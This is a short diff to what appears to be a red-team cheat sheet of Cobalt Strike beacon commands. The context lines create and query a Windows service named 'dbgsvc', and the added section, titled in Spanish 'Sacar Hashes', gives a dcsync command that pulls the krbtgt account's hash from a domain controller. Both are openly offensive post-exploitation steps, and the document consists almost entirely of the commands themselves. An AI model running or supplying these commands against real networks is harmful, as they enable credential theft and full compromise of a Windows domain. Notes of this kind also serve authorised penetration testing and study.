@@ -48,3 +48,12 @@ beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Wind
 ```powershell
 beacon> sc_qc dbgsvc
 ```
+
+
+## Sacar Hashes
+
+```powershell
+beacon> dcsync contoso.com CONTOSO\krbtgt
+```
+
+
